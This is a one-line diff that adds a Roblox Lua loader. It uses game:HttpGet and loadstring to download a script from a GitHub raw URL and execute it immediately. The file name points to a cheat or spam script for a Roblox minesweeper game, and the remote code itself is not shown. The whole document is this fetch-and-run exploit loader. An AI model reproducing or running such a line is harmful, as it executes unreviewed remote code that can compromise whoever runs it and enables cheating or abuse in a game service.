@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/blockerman-s-minesweeper-spam3-z8bam6n2o525nr.lua"))()
